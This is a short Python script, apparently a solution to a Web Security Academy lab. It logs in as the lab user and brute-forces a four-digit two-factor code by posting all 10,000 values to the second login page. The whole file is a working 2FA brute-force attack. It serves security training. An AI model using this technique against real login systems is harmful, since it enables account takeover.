import requests
import sys
from bs4 import BeautifulSoup
import multiprocessing

"""
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
"""

# For me only
site = 'acfa1fae1eb1517480b20d2f004800d9.web-security-academy.net'

s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

logindata = {
    'csrf': csrf,
    'username': 'carlos',
    'password': 'montoya'
}
print(f'Logging in as carlos:montoya')
resp = s.post(login_url, data=logindata)
print(f'Login response: {resp.text}')


soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Second page
login2_url = f'https://{site}/login2'
for x in range(10000):
    login2data = {
        'csrf': csrf,
        'mfa-code': str(x).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 302:
        print(f'2fa valid with response code {resp.status_code} using {login2data["mfa-code"]}')
        # Visit account profile page to complete level
    else:
        print(f'2fa invalid with response code: {resp.status_code}')
